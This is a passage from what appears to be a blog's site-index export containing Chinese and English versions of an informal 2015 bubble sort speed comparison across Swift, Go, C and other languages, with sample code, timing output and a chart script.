[83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21] for _ in 1...100 &#123; for _ in 1 ... array.count &#123; for y in 0 ... (array.count - 2) &#123; if array[y+1] &lt; array[y] &#123; let t &#x3D; array[y] array[y] &#x3D; array[y+1] array[y+1] &#x3D; t &#125; &#125; &#125; &#125; &#125; benchmarkBubbleSort() 從上面的範例中，你很難分辨哪種語言更好。然而，結果很容易猜測， $ sh run.sh testing: warning: no tests to run PASS BenchmarkBubbleSort-4 1000000000 0.09 ns&#x2F;op ok _&#x2F;home&#x2F;neo&#x2F;Documents&#x2F;go_vs_swift **0.740s** Compiling swift 11 months ago fix Start test 2 years ago relocate real **5.85** user 5.75 sys 0.04 Swift 在 5.85 秒內完成，但 Go 只需要 0.74 秒。 其他語言 好吧，我很好奇其他語言的效能。每種語言測試運行 3 次，並捨棄第一次運行的時間。結果是第二次和最後一次運行的平均值。這已經足夠了，因為這個測試只是為了好玩。 警告：所有編譯器/直譯器都沒有使用優化旗標。一旦你應用這些旗標，你會體驗到巨大的差異。我不會深入探討這個主題。 C #define SIZE 1000 int main() &#123; short array [SIZE]&#x3D; &#123;83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21&#125; int t; for (int c &#x3D; 0; c &lt; 100; c++) &#123; for (int i &#x3D; 0; i &lt; SIZE; i++) &#123; for (int y &#x3D; 0; y &lt; SIZE - 1; y++) &#123; if (array[y+1] &lt; array[y]) &#123; t &#x3D; array[y]; array[y] &#x3D; array[y+1]; array[y+1] &#x3D; t; &#125; &#125; &#125; &#125; &#125; 我們使用 gcc 和 clang 編譯 C。gcc 在 0.218 秒內完成排序，而 clang 在 0.193 秒內完成。 Java (1.8.0) （程式碼省略） Javascript (nodejs v0.10.25) （程式碼省略） PHP (5.6.11-1ubuntu3.1) （程式碼省略） Python (Python 2.7.10) （程式碼省略） Java 是贏家！至少對於不知道如何設定優化旗標的傻瓜來說是這樣。 結果 警告：所有編譯器/直譯器都沒有使用優化旗標。一旦你應用這些旗標，你會體驗到巨大的差異。我不會深入探討這個主題。 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_30bc05d04')); var option = { title: { text: '不同語言氣泡排序的時間（毫秒）', subtext: '越低越好', left: 'center' }, tooltip: { trigger: 'axis', axisPointer: { type: 'shadow' } }, xAxis: { type: 'category', data: ['Swift', 'Go', 'C (gcc)', 'C (clang)'], axisLabel: { rotate: 30 } }, yAxis: { type: 'value', name: '時間（毫秒）', min: 0 }, series: [ { name: '氣泡排序時間', type: 'bar', data: [5850, 740, 218, 193], itemStyle: { color: function(params) { const colors = ['#c23531', '#2f4554', '#61a0a8', '#91c7ae']; return colors[params.dataIndex]; } }, label: { show: true, position: 'top' } } ] };; chart.setOption(option); } })(); GitHub 上的原始碼 https://github.com/neoalienson/c_java_javascript_go_php_python_swift 📖 neoalienson/c_java_javascript_go_php_python_swift ⭐ 1 Stars 🍴 0 Forks Language: Swift","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"},{"name":"C#","slug":"C","permalink":"https://neo01.com/tags/C/"},{"name":"Go","slug":"Go","permalink":"https://neo01.com/tags/Go/"},{"name":"PHP","slug":"PHP","permalink":"https://neo01.com/tags/PHP/"},{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"}],"lang":"zh-TW"},{"title":"C、Go、Java、Javascript、PHP、Python 和 Swift 的趣味基准测试","slug":"2015/12/go-vs-swift-a-simple-benchmark-test-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2015/12/go-vs-swift-a-simple-benchmark-test/","permalink":"https://neo01.com/zh-CN/2015/12/go-vs-swift-a-simple-benchmark-test/","excerpt":"Java 竟然赢了？7 种语言气泡排序性能对决，结果出人意料","text":"故事从 Swift 和 Go 开始 我更喜欢 Apple 的 Swift 语言的美感，胜过 Google 的 Go。好吧，这是主观的。Apple 已将 Swift 开源，我决定运行一个简单的基准测试，以客观地了解哪种语言在速度方面更好。 Swift 在 5.85 秒内完成，但 Go 只需要 0.74 秒。 其他语言 好吧，我很好奇其他语言的性能。每种语言的测试运行 3 次，并舍弃第一次运行的时间。结果是第二次和最后一次运行的平均值。这已经足够了，因为这个测试只是为了好玩。 警告：所有编译器/解释器都没有使用优化标志。一旦你应用这些标志，你会体验到巨大的差异。我不会深入探讨这个主题。 Java 是赢家！至少对于不知道如何设置优化标志的傻瓜来说是这样。 结果 警告：所有编译器/解释器都没有使用优化标志。一旦你应用这些标志，你会体验到巨大的差异。我不会深入探讨这个主题。 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_41d13504b')); var option = { title: { text: '不同语言冒泡排序的时间（毫秒）', subtext: '越低越好', left: 'center' }, tooltip: { trigger: 'axis', axisPointer: { type: 'shadow' } }, xAxis: { type: 'category', data: ['Swift', 'Go', 'C (gcc)', 'C (clang)'], axisLabel: { rotate: 30 } }, yAxis: { type: 'value', name: '时间（毫秒）', min: 0 }, series: [ { name: '冒泡排序时间', type: 'bar', data: [5850, 740, 218, 193], itemStyle: { color: function(params) { const colors = ['#c23531', '#2f4554', '#61a0a8', '#91c7ae']; return colors[params.dataIndex]; } }, label: { show: true, position: 'top' } } ] };; chart.setOption(option); } })(); GitHub 上的源代码 https://github.com/neoalienson/c_java_javascript_go_php_python_swift 📖 neoalienson/c_java_javascript_go_php_python_swift ⭐ 1 Stars 🍴 0 Forks Language: Swift","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"},{"name":"C#","slug":"C","permalink":"https://neo01.com/tags/C/"},{"name":"Go","slug":"Go","permalink":"https://neo01.com/tags/Go/"},{"name":"PHP","slug":"PHP","permalink":"https://neo01.com/tags/PHP/"},{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"}],"lang":"zh-CN"},{"title":"A just for fun benchmark test for C, Go, Java, Javascript, PHP, Python and Swift","slug":"2015/12/go-vs-swift-a-simple-benchmark-test","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2015/12/go-vs-swift-a-simple-benchmark-test/","permalink":"https://neo01.com/2015/12/go-vs-swift-a-simple-benchmark-test/","excerpt":"Java wins? Bubble sort performance showdown across 7 languages reveals surprising results without optimization flags.","text":"The story begins with Swift and Go I like the beauty of Apple’s Swift language more than Google’s Go. Ok, it is subjective. Apple has Swift open source, I decided to run a simple benchmark test to have an objective idea for which language is better in terms of speed. Bubble sort in Go, package main import &quot;testing&quot; func BenchmarkBubbleSort(b *testing.B) &#123; array :&#x3D; [...]int&#123;83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21&#125; for c :&#x3D; 0; c &lt; 100; c++ &#123; for i :&#x3D; 0; i &lt; len(array); i++ &#123; for y :&#x3D; 0; y &lt; len(array) - 1; y++ &#123; if array[y+1] &lt; array[y] &#123; t :&#x3D; array[y] array[y] &#x3D; array[y+1] array[y+1] &#x3D; t &#125; &#125; &#125; &#125; &#125; Bubble sort in Swift, func benchmarkBubbleSort() &#123; var array : [Int] &#x3D; [83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21] for _ in 1...100 &#123; for _ in 1 ... array.count &#123; for y in 0 ... (array.count - 2) &#123; if array[y+1] &lt; array[y] &#123; let t &#x3D; array[y] array[y] &#x3D; array[y+1] array[y+1] &#x3D; t &#125; &#125; &#125; &#125; &#125; benchmarkBubbleSort() You can hardly tell which language is better from the above samples. However, the results is pretty easy to guess, $ sh run.sh testing: warning: no tests to run PASS BenchmarkBubbleSort-4 1000000000 0.09 ns&#x2F;op ok _&#x2F;home&#x2F;neo&#x2F;Documents&#x2F;go_vs_swift **0.740s** Compiling swift 11 months ago fix Start test 2 years ago relocate real **5.85** user 5.75 sys 0.04 Swift completed in 5.85 seconds but Go only needs 0.74 seconds. Other languages Ok, I am curious to know the performance of other languages. Test runs 3 times for each language, and discard time from the first run. The result is average from the second and last run. It is enough as this test is just for fun. Warning: No optimization flag uses for all compilers/interpreters. You will experience huge differences once you apply those flag. I will not go deep into this topic. C #define SIZE 1000 int main() &#123; short array [SIZE]&#x3D; &#123;83,86,77,15,93,35,86,92,49,21,62,27,90,59,63,26,40,26,72,36,11,68,67,29,82,30,62,23,67,35,29,2,22,58,69,67,93,56,11,42,29,73,21,19,84,37,98,24,15,70,13,26,91,80,56,73,62,70,96,81,5,25,84,27,36,5,46,29,13,57,24,95,82,45,14,67,34,64,43,50,87,8,76,78,88,84,3,51,54,99,32,60,76,68,39,12,26,86,94,39,95,70,34,78,67,1,97,2,17,92,52,56,1,80,86,41,65,89,44,19,40,29,31,17,97,71,81,75,9,27,67,56,97,53,86,65,6,83,19,24,28,71,32,29,3,19,70,68,8,15,40,49,96,23,18,45,46,51,21,55,79,88,64,28,41,50,93,0,34,64,24,14,87,56,43,91,27,65,59,36,32,51,37,28,75,7,74,21,58,95,29,37,35,93,18,28,43,11,28,29,76,4,43,63,13,38,6,40,4,18,28,88,69,17,17,96,24,43,70,83,90,99,72,25,44,90,5,39,54,86,69,82,42,64,97,7,55,4,48,11,22,28,99,43,46,68,40,22,11,10,5,1,61,30,78,5,20,36,44,26,22,65,8,16,82,58,24,37,62,24,0,36,52,99,79,50,68,71,73,31,81,30,33,94,60,63,99,81,99,96,59,73,13,68,90,95,26,66,84,40,90,84,76,42,36,7,45,56,79,18,87,12,48,72,59,9,36,10,42,87,6,1,13,72,21,55,19,99,21,4,39,11,40,67,5,28,27,50,84,58,20,24,22,69,96,81,30,84,92,72,72,50,25,85,22,99,40,42,98,13,98,90,24,90,9,81,19,36,32,55,94,4,79,69,73,76,50,55,60,42,79,84,93,5,21,67,4,13,61,54,26,59,44,2,2,6,84,21,42,68,28,89,72,8,58,98,36,8,53,48,3,33,33,48,90,54,67,46,68,29,0,46,88,97,49,90,3,33,63,97,53,92,86,25,52,96,75,88,57,29,36,60,14,21,60,4,28,27,50,48,56,2,94,97,99,43,39,2,28,3,0,81,47,38,59,51,35,34,39,92,15,27,4,29,49,64,85,29,43,35,77,0,38,71,49,89,67,88,92,95,43,44,29,90,82,40,41,69,26,32,61,42,60,17,23,61,81,9,90,25,96,67,77,34,90,26,24,57,14,68,5,58,12,86,0,46,26,94,16,52,78,29,46,90,47,70,51,80,31,93,57,27,12,86,14,55,12,90,12,79,10,69,89,74,55,41,20,33,87,88,38,66,70,84,56,17,6,60,49,37,5,59,17,18,45,83,73,58,73,37,89,83,7,78,57,14,71,29,0,59,18,38,25,88,74,33,57,81,93,58,70,99,17,39,69,63,22,94,73,47,31,62,82,90,92,91,57,15,21,57,74,91,47,51,31,21,37,40,54,30,98,25,81,16,16,2,31,39,96,4,38,80,18,21,70,62,12,79,77,85,36,4,76,83,7,59,57,44,99,11,27,50,36,60,18,5,63,49,44,11,5,34,91,75,55,14,89,68,93,18,5,82,22,82,17,30,93,74,26,93,86,53,43,74,14,13,79,77,62,75,88,19,10,32,94,17,46,35,37,91,53,43,73,28,25,91,10,18,17,36,63,55,90,58,30,4,71,61,33,85,89,73,4,51,5,50,68,3,85,6,95,39,49,20,67,26,63,77,96,81,65,60,36,55,70,18,11,42,32,96,79,21,70,84,72,27,34,40,83,72,98,30,63,47,50,30,73,14,59,22,47,24,82,35,32,4,54,43,98,86,40,78,59,62,62,83,41,48,23,24,72,22,54,35,21,57,65,47,71,76,69,18,1,3,53,33,7,59,28,6,97,20,84,8,34,98,91,76,98,15,52,71,89,59,6,10,16,24,9,39,0,78,9,53,81,14,38,89,26,67,47,23,87,31,32,22,81,75,50,79,90,54,50,31,13,57,94,81,81,3,20,33,82,81,87,15,96,25,4,22,92,51,97,32,34,81,6,15,57,8,95,99,62,97,83,76,54,77,9,87,32,82,21,66,63,60,82,11,85,86,85,30,90,83,14,76,16,20,92,25,28,39,25,90,36,60,18,43,37,28,82,21,10,55,88,25,15,70,37,53,8,22,83,50,57,97,27,26,69,71,51,49,10,28,39,98,88,10,93,77,90,76,99,52,31,87,77,99,57,66,52,17,41,35,68,98,84,95,76,5,66,28,54,28,8,93,78,97,55,72,74,45,0,25,97,83,12,27,82,21&#125; int t; for (int c &#x3D; 0; c &lt; 100; c++) &#123; for (int i &#x3D; 0; i &lt; SIZE; i++) &#123; for (int y &#x3D; 0; y &lt; SIZE - 1; y++) &#123; if (array[y+1] &lt; array[y]) &#123; t &#x3D; array[y]; array[y] &#x3D; array[y+1]; array[y+1] &#x3D; t; &#125; &#125; &#125; &#125; &#125; We compile C with gcc and clang. gcc complete the soring in 0.218, while clang in 0.193. Java (1.8.0) class Benchmark &#123; public static void main (String args[]) &#123; int[] array &#x3D; new 